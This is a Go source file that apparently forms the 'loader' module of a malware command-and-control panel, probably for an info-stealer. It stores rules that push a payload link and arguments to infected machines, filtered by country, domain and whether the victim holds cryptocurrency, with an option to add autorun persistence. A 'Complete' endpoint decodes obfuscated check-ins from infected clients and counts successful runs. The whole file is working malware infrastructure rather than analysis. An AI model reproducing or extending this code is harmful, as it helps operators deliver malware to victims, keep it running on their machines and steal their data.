package loader

import (
	"io/ioutil"
	"math/rand"
	"net/http"

	database "../../db"
	lggr "../../logger"
	utils "../../utils"
	login "../login"

	"github.com/gin-gonic/gin"
)

var db = database.Connect()
var logger = lggr.Log()

type LoaderData struct {
	Id           int    `db:"Id" json:"id"`
	Link         string `db:"Link" json:"link"`
	Args         string `db:"Args" json:"args"`
	Countries    string `db:"Countries" json:"countries"`
	CountryExept string `db:"CountryExept" json:"country_exept"`
	Domains      string `db:"Domains" json:"domains"`
	OnlyCrypto   bool   `db:"OnlyCrypto" json:"only_crypto"`
	AddAutorun   bool   `db:"AddAutorun" json:"add_autorun"`
	Loads        int    `db:"Loads" json:"loads"`
	Runs         int    `db:"Runs" json:"runs"`
	Status       bool   `db:"Status" json:"status"`
}

func GetLoaderRules() (loaderRules []LoaderData) {
	err := db.Select(&loaderRules, "SELECT * FROM `loader` ORDER BY `Id` DESC")
	if err != nil {
		logger.Println("loader.GetLoaderRules: ", err)
	}

	return loaderRules
}

func GetRules(ctx *gin.Context) {
	if !login.CtxRootAuthCheck(ctx) {
		logger.Println("loader.GetRules: unauthorized user: ", ctx.ClientIP())
		return
	}

	rulesData := GetLoaderRules()
	if len(rulesData) < 1 {
		ctx.JSON(http.StatusOK, "")
		return
	}

	ctx.JSON(http.StatusOK, rulesData)
}

type LoaderRuleAction struct {
	Cookie   string     `json:"cookie"`
	IsCreate bool       `json:"isCreate"`
	Data     LoaderData `json:"form"`
}

func Create(ctx *gin.Context) {
	var rule LoaderRuleAction
	ctx.BindJSON(&rule)

	if !login.RootAuthCheck(rule.Cookie) {
		logger.Println("loader.Create: unauthorized user: ", ctx.ClientIP())
		return
	}

	_, err := db.Exec("INSERT INTO `loader` (`Link`, `Args`, `Countries`, `CountryExept`, `Domains`, `OnlyCrypto`, `AddAutorun`, `Loads`, `Runs`, `Status`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
		rule.Data.Link,
		rule.Data.Args,
		rule.Data.Countries,
		rule.Data.CountryExept,
		rule.Data.Domains,
		rule.Data.OnlyCrypto,
		rule.Data.AddAutorun,
		0,
		0,
		rule.Data.Status,
	)

	if err != nil {
		logger.Println("loader.Create: ", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}

func Edit(ctx *gin.Context) {
	var rule LoaderRuleAction
	ctx.BindJSON(&rule)

	if !login.RootAuthCheck(rule.Cookie) {
		logger.Println("loader.Edit: unauthorized user: ", ctx.ClientIP())
		return
	}

	_, err := db.Exec("UPDATE `loader` SET `Link` = ?, `Args` = ?, `Countries` = ?, `CountryExept` = ?, `Domains` = ?, `OnlyCrypto` = ?, `AddAutorun` = ?, `Status` = ? WHERE `Id` = ?",
		rule.Data.Link,
		rule.Data.Args,
		rule.Data.Countries,
		rule.Data.CountryExept,
		rule.Data.Domains,
		rule.Data.OnlyCrypto,
		rule.Data.AddAutorun,
		rule.Data.Status,
		rule.Data.Id,
	)

	if err != nil {
		logger.Println("grabber.Edit: ", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}

func Run(ctx *gin.Context) {
	var rule LoaderRuleAction
	ctx.BindJSON(&rule)

	if !login.RootAuthCheck(rule.Cookie) {
		logger.Println("loader.Run: unauthorized user: ", ctx.ClientIP())
		return
	}

	_, err := db.Exec("UPDATE `loader` SET `Status` = NOT `Status` WHERE `Id` = ?", rule.Data.Id)
	if err != nil {
		logger.Println("loader.Run: ", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}

func Delete(ctx *gin.Context) {
	var rule LoaderRuleAction
	ctx.BindJSON(&rule)

	if !login.RootAuthCheck(rule.Cookie) {
		logger.Println("loader.Delete: unauthorized user: ", ctx.ClientIP())
		return
	}

	_, err := db.Exec("DELETE FROM `loader` WHERE `Id` = ?", rule.Data.Id)
	if err != nil {
		logger.Println("loader.Delete: ", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}

func Complete(ctx *gin.Context) {
	body := ctx.Request.Body
	bodyBytes, err := ioutil.ReadAll(body)
	if err != nil {
		logger.Println("loader.LoaderComplete: read request body error: ", err)
		ctx.String(http.StatusOK, utils.EncryptData(utils.GenRandStr(rand.Intn(100))))
		return
	}
	defer body.Close()

	ruleId := utils.DecodeData(string(bodyBytes))

	_, err = db.Exec("UPDATE `loader` SET `Runs` = `Runs` + 1 WHERE `Id` = ?", ruleId)
	if err != nil {
		logger.Println("loader.LoaderComplete: ", err)
	}
}
